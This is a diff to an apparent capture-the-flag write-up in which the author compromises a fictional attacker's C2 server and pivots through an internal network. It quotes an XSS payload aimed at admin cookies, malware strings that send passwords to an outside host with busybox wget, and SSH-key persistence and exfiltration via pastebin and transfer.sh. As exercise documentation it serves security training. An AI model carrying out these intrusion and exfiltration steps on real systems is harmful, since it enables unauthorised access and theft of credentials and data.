@@ -165,9 +165,9 @@ It had not worked. The file ran but it couldn't execute
 The same occured when checking if it was for a blacklist simple filter on kek.jpg.png.
 `cd` was the only command I found that could work. kek.jpg.png was then edited to be a basic php command `<?php echo exec('ls')?>, but still no dice.
 
-Some time passed, and I was toying with some ideas for an XSS attack to steal admin cookies, just some basic testing to see if I could have it exec (which an alert was successfully execed by having a user with the "Full Name" as `<script>alert("XSS"<\script>`
+Some time passed, and I was toying with some ideas for an XSS attack to steal admin cookies or have code execution on the admins PC, just some basic testing to see if I could have it exec (which an alert was successfully execed by having a user with the "Full Name" as `<script>alert("XSS"<\script>`
 
-This attempt was successful but at this time was not utilized further. It runs on any page where the name was vulnerable: 
+This attempt was successful but at this time was not utilized further. It runs on any page where the name was visible and would likely also be able to be used with the message system: 
 
 ![xss-exec](images/screenshots/xss-alert.png)
 
@@ -337,31 +337,295 @@ In addition a GoBuster scan was run, which found the following 3 directories:
 
 ### Attempting to Find Access
 
+#### Basic Attempts
+
+- Tried to do directory traversal through the url
+
 #### SSH Attempt(s)
 
 Tries using Bitnami's credentials, but needed an ssh key, may look to see if I can steal one from the public web server if cannot find way in.
 
 ![sshattempt](images/screenshots/c2sshattempt.png)
 
-#### Temp Brief Overview of Other Things Just Too Tired To Write up RN
+#### Running with Wireshark
 
-Accessing the urls in the buster, reversing part of helper.prog
+Ran the app while having wireshark running, did not have anything interesting occur I didn't find a single call to the c2, all were to github. This may have been in part due to some internet shenanigans from earlier (internet has been up and down all night)
 
-Found some bits and pieces of strings suggesting passwords in the urls but can't make much sense of them, might be because of tiredness or just because I'm missing info not sure. 
+#### Strings in helper.prog file that's retrieved
 
-Tried to do directory traversal through the url
+> 0008cea5	./busybox wget http://REDACTEDIP:6932/upload?pass=$newpass&payload=test 
+	"./busybox wget http://REDACTEDIP:6932/upload?pass=\$newpass&payload=test \n"	ds
 
-I can't think of much more I'm about to fall asleep. It didn't help my internet has been on/off all night >_<
+> 0008ce51	newpass='cat retpass?prepass=	"newpass='cat retpass?prepass="	ds
 
-## Delivery
+> 0008ce14	./busybox wget http://REDACTEDIP:6932/retpass?prepass=	"./busybox wget http://REDACTEDIP:6932/retpass?prepass="	ds
 
-## Exploitation
+Okay, so maybe they've reused credentials on this prepass, if not, I'm going to try fuzzing it.
 
-## Installation
+Credentials that were tried and failed:
 
-## Command and Control
+1. overthehill7 (android app zip)
+2. dreamer1 (jricho's pass)
+3. BkmuowNTohD5 (bitnami)
 
-## Actions on Objective
+Well time to start a fuzzing attempt while searching for a new method of access.
+
+##### Brute-forcing the pass
+
+While I was thinking of new ideas, I ran a custom py-script made for potentially discovering the password. This was not successful but was running on the my C2 whilst waiting for any new ideas for getting access. (This didn't lead anywhere, but section below was successful!) I figured it was worth a try, if C2 ended up getting blocked, I just burn the ip and get it a new one (never happened).
+
+### Discovering a Massive Oversight
+
+It was brought to my attention, that in my tired state I never bothered directly running the files that are fetched in the anarf-signup-text APK ([helper.prog](files/exfiled-files/helper.prog) and [busybox](files/exfiled-files/busybox))
+
+So after loading a new VM and re-installing the anarf-signup-test.apk as well as pushing the helper.prog and busybox files to /data/local/tmp to execute them individually, the following occured: 
+
+![imdumb](images/screenshots/imdumb.png)
+
+Taking that prepass and using it on the website gets the password needed for code execution:
+
+![imdumb2](images/screenshots/imdumb2.png)
+
+Successful code execution
+
+![thankyou](image/../images/screenshots/thankyou.png)
+
+In addition I looked at the C2 source code which contained a link to Rick Roll saying to sing this for extra credit. Of course, I had. I'll never miss a chance to sing NGGYU. 
+
+![nggyu](images/screenshots/c2source.png)
+
+And checking with a quick whoami payload we can see that any payload is executed as root!
+
+![ezserverroot](images/screenshots/serverezroot.png)
+
+After a bit of poking around, it was found that in the /home directory there was a user named ubuntu. And I had the idea to potentially add myself to the .ssh/authorized_keys file which would allow for me to ssh into the server as ubuntu.
+
+Checking the file I could see there was already a key in there. So careful to not mess up anyone elses connection I made sure to use `>>` when appending
+
+![sshfilepre](images/screenshots/heyosshkeys.png)
+
+I generated a new key and uploaded it to pastebin, which I then wget'd onto the server.
+
+![sshkeyon](images/screenshots/wget.png)
+
+Then tried to append it to the keys
+
+![sshappend](images/screenshots/adding-key.png)
+
+It had succesfully appended, but my ssh attempts were still failing.
+
+I had been hung here for a while, but uh... it was mainly due to me forgetting to specify the user in my connection script \^\_\^; 
+
+That being said, before I realized this issue I tried generating an rsa key and uploading/inserting in various ways. After figuring out the issue, I removed the old (unused) ssh-key insertions from authorized_keys by using sed to remove the unwanted lines
+
+After correcting my `connectc2.sh` from 
+
+`torify ssh REDACTEDIP -i ~/.ssh/id_rsa`
+
+to
+
+`torify ssh ubuntu@REDACTEDIP -i ~/.ssh/id_rsa`
+
+I was able to successfully ssh into the server as ubuntu. While I would have prefered to do this from my C2 server and without a key tagged with Miles@fail-not, I was at least content as none of this was real identifying information and the connection was torified. 
+
+### Quick Network Enumeration
+
+#### General Network  Scan
+
+Took a look at the internal network with `ip addr`
+
+![c2addr](images/screenshots/c2ipaddr.png)
+
+#### Scanning the Interfaces
+
+Then scanned these interfaces with nmap
+
+##### 10.0.0.77/24
+
+![077/24](images/screenshots/c2077subnet.png)
+
+##### 10.0.55.59/24
+
+Couldn't scan all ports for some reason, would hang and not finish for hours. Regardless this should suffice for future
+
+![5554/24](images/screenshots/c25554subnet.png)
+
+## Telnet Thievery
+On the server, there was a script called `status-update.sh`
+
+![blind2](images/screenshots/c2pivot-imblind.png)
+
+By using on online base 64-decoder I was able to decode that the credentials were:
+
+> user: teletubby
+> pass: tubby custard
+
+#### Network Enumeration in 10.0.55.44
+
+Ran `ip addr` to look for anything new and interesting
+
+![telnetip](images/screenshots/telnet-ipaddr.png)
+
+nmap, however, was not installed, so I wrote a small oneliner to run through and check to see if there were any new visible boxes:
+
+`for i in {0..255} do ping -c 1 IP.GOES.HERE.$i > /dev/null; [ $? -eq 0 ] && echo "$i responded"; done`
+
+However this was extremely slow so I looked for a faster solution online. And found [this very similar solution](https://linuxconfig.org/bash-scripts-to-scan-and-monitor-network)
+
+```
+#!/bin/bash
+
+is_alive_ping()
+{
+  ping -c 1 $1 > /dev/null
+  [ $? -eq 0 ] && echo Node with IP: $i is up.
+}
+
+for i in IP.GOES.HERE.{1..255} 
+do
+is_alive_ping $i & disown
+done
+```
+
+which I modified to the onliner
+
+` p() { ping -c 1 $1 > /dev/null; [ $? -eq 0 ] && echo Node with IP: $i is up. ; } ; for i in IP.GOES.HERE.{1..255}; do p $i & disown ; done ` 
+
+which had some ugly output but nevertheless seemed to work until I realized it was missing some points. So, now I began to realize I'd need an nmap binary...yay. Luckily I know I can find one [here](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux)
+
+[(Alternate direct link directly to nmap x86_64 download)](https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap)
+
+After curling it onto the box
+
+![gettingnmap](images/screenshots/telnet-gettingnmap.png)
+
+I ran it and got the following. Nothing new, but it seems this box can't see the 10.0.55.59 box from earlier. 
+
+![telnetnmap](images/screenshots/telnet-nmap.png)
+
+### Spotting Some Savory SSH Key~~s~~
+
+In the server, after poking around in various files I noticed that there was an ssh-key in the file `/home/ubuntu/ubuntu-management-server-key`
+
+![keyfound](images/screenshots/telnet-keyfound.png)
+
+Which I then copy pasted into a pastebin and uploaded to the C2 server using wget from the website (in retrospect I could have done this through the ssh but I'd have had to open a new connection and it was just an oversight)
+
+![sshkeyon2](images/screenshots/wgetkey.png)
+
+I hadn't noticed any other files that were interesting that I could easily access.  I tried the same python escalation tactic [from earlier](#snake-bite-python-exploitation-for-elevated-access) but it hadn't resulted in anything (attempted exploiting various libs for elevated privleges)
+
+### Funny Telnet Struggles
+
+Here's me looking like an idiot trying to close the telnet connection. Have a laugh :). Don't try working too late; otherwise, you just make dumb mistakes like these
+
+![dummy](images/screenshots/exitting-telnet-like-an-idiot.png)
+
+### Realizing I extracted the key wrong
+
+Trying to ssh into the other servers, I had a suspicion that there was something wrong with the key. As a matter of fact, it decided to not alert me that the key was in an invalid format until many minutes (maybe hours) after. 
+
+
+
+I reconnected with the telnet connection and then proceeded to directly upload the ssh-key by curling it to transfer.sh. Then I curled it from transfer.sh onto the C2 into /home/ubuntu/.ssh as id_rsa. I then generated a public key in id_rsa.pub and fixed the permissions.
+
+No output here but here's a snippet of the commands used.
+
+![c2-stolen-key](images/screenshots/c2-download-stolen-key.png)
+
+I then successfully ssh'd into the 10.0.55.42 box as ubuntu (the other boxes failed)
+
+## Exploring the New Box (10.0.55.42)
+
+Interesting to note that this box has no direct connection to the internet, so any binaries or exfils will be done using scp since we have ssh access. Sadly it does not have nmap which is unfortunate. 
+
+![nointernmap](images/screenshots/manage-no-internet.png)
+
+So, I'll get it to the box myself. To do this, I curl'd the same file from earlier and scp'd it onto the box.
+
+![manage-get-nmap](images/screenshots/manage-get-nmap.png)
+
+### Network Enumeration
+
+#### IP Addr
+
+![ipaddrmanage](images/screenshots/manage-ipaddr.png)
+
+##### Nmap scanning 10.0.55.42/24
+
+![manage-nmap-5542](images/screenshots/manage-nmap-5542.png)
+
+##### Nmap scanning 10.0.13.37/24
+
+![manage-nmap-1337](images/screenshots/manage-nmap-1377.png)
+
+## Exploring 10.0.13.77 as jricho
+
+By using the cracked credentials from earlier, I was able to ssh into this box as jricho. 
+
+Once again it seemed this box had no connection to the internet. However, in /home/ubuntu there were two interesting files: 
+
+- password-manager_linux-x86_64   
+- stolen-information.zip
+  
+These were exfiled to the C2 server via scp must like how nmap was put onto the previous box. 
+
+Below is the end of the pass manager getting exfiled for demonstration purposes (I had transfered the file to the 10.0.55.42 box using scp just prior to this)
+
+![ex-pass](images/screenshots/exfil-pass-manag.png)
+
+The password manager ran with the following when run on the server:
+
+![ex-pass-run](images/screenshots/passwordmanager.png)
+
+Will attempt to reverse when done here or hitting a wall.
+
+### Network Enumeration
+
+#### IP Addr
+
+![ipaddr](images/screenshots/1377-ipaddr.png)
+
+#### Scanning Interfaces
+
+![ipaddr](images/screenshots/1377-nmap.png)
+
+## Reversing the Password Manager
+
+This password manager may hold the key (literally) for me to unlock the file. 
+
+Opening it in Ghidra and running the string analyzer allowed me to find this useful section of strings:
+
+![pass1](images/screenshots/passwordmanager-strings.png)
+
+Noticing the recovery code option, I took a look at the recovery codes that were found in the admin messages in the db from [earlier](#slithering-into-the-mysql-server)
+
+> Your Recovery Codes Are:     jkl345g     n84jfgj     x93mfgl     w93mnf9          Save these codes, as if you''ll need them to access your password manager if you forget your password
+
+Running the file with the recovery option and entering all of the recovery codes got the following
+
+![recove](images/screenshots/passwordmanager-imin.png)
+
+And using that I was able to get the password for the stolen-information.zip
+
+![pass](images/screenshots/passwordmanager-pass.png)
+
+![extractedinfo](images/screenshots/stolen-info-hackermanned.png)
+
+## The Stolen Info
+
+There was a [single csv](files/exfiled-files/stolen-information/us-500-implant-collection-test.csv) in the file which when file is run on, shows that it's a zip file.
+
+![file](images/screenshots/stolen-info-file.png)
+
+Extracting this results in 3 preview jpgs, and an index folder and a Metadata folder. The index folder (and the subfolder within) contained a lot of .iwa files. 
+
+I could not figure how to open this. As of this moment
+
+
+## Network Graph of Target
+
+![netgraph](images/screenshots/networkgraph.png)
 
 *******************
 
